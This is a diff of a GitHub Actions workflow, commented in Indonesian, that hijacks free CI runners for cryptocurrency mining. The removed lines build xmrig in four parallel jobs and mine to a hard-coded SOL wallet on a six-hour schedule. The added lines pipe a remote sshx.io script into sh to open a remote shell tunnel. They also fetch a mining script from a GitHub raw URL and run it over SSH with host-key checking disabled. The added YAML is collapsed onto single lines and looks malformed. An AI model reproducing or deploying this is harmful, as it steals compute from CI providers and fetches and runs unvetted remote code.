@@ -1,63 +1,24 @@
-name: sol-miner
+name: sshx-vps-mining
 
-on:
-  workflow_dispatch:
-  schedule:
-    - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
+on: workflow_dispatch: schedule: - cron: "0 */6 * * *"  # Jalan otomatis tiap 6 jam
 
-jobs:
-  miner1:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
-    steps:
-      - name: Start Miner 1
-        run: |
-          sudo apt update
-          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-          git clone https://github.com/xmrig/xmrig.git
-          mkdir xmrig/build && cd xmrig/build
-          cmake ..
-          make -j$(nproc)
-          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker1 -p x --threads=4
+jobs: mining: runs-on: ubuntu-latest timeout-minutes: 360
 
-  miner2:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
-    steps:
-      - name: Start Miner 2
-        run: |
-          sudo apt update
-          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-          git clone https://github.com/xmrig/xmrig.git
-          mkdir xmrig/build && cd xmrig/build
-          cmake ..
-          make -j$(nproc)
-          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker2 -p x --threads=4
+steps:
+  - name: Connect to SSHX VPS and run remote miner
+    run: |
+      echo "[+] Starting SSHX Tunnel..."
+      curl -sSf https://sshx.io/get | sh -s run > log.txt &
 
-  miner3:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
-    steps:
-      - name: Start Miner 3
-        run: |
-          sudo apt update
-          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-          git clone https://github.com/xmrig/xmrig.git
-          mkdir xmrig/build && cd xmrig/build
-          cmake ..
-          make -j$(nproc)
-          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker3 -p x --threads=4
+      sleep 10  # Tunggu sshx aktif
 
-  miner4:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
-    steps:
-      - name: Start Miner 4
-        run: |
-          sudo apt update
-          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-          git clone https://github.com/xmrig/xmrig.git
-          mkdir xmrig/build && cd xmrig/build
-          cmake ..
-          make -j$(nproc)
-          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker4 -p x --threads=4
+      LINK=$(grep -o 'https://sshx.io/[^ ]*' log.txt | head -n1)
+      HOST=$(echo $LINK | cut -d/ -f3)
+      echo "[+] SSHX Link: $LINK"
+
+      # Unduh skrip mining dari GitHub (pastikan kamu upload remote.sh ke repo kamu)
+      curl -sO https://raw.githubusercontent.com/Nsal12/mning/refs/heads/main/mining.sh
+      chmod +x mining.sh
+
+      echo "[+] Menjalankan script mining di VPS via SSH..."
+      ssh -o StrictHostKeyChecking=no -p 2222 sshx@$HOST 'bash -s' < mining.sh
